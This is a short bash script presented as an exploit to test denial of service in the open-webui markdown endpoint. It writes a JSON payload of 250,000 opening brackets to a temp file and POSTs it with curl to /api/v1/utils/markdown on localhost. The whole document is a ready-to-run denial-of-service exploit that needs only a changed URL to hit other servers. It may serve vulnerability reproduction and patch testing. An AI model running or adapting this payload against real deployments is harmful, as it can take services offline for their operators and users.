#!/bin/bash
# Exploit script to test Denial of Service in open-webui markdown endpoint

# Create a large payload file with JSON format
payload_file=$(mktemp)
echo -n "{\"md\": \"" > "$payload_file"
printf "[%.0s" {1..250000} >> "$payload_file"
echo "\"}" >> "$payload_file"

# Send the payload file to the vulnerable endpoint
curl -X POST http://localhost:3000/api/v1/utils/markdown -H "Content-Type: application/json" --data-binary @"$payload_file"

# Clean up
rm "$payload_file"